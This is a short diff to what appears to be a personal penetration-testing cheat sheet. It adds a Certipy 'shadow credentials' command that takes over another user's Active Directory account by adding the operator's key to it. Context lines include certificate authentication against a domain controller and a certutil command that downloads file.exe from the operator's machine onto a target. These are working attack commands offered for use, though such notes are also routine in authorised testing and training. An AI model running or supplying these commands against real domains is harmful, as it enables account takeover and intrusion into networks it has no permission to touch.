@@ -501,6 +501,8 @@ certipy auth -pfx cert.pfx -dc-ip $targetip
 # 5. Convert a certificate (PEM)
 certipy cert -pfx cert.pfx -key key.pem -cert cert.pem
 
+#6 Shadow credentials let you log in as another user because you add your own key to their AD entry.
+certipy shadow -u $user -p $password -dc-ip $targetip -account targetuser
 
 ######################################################################
 # MISC / GENERAL
@@ -524,4 +526,5 @@ certutil -urlcache -split -f http://$localip/file.exe file.exe
 ######################################################################
 
 ######################################################################
+
 
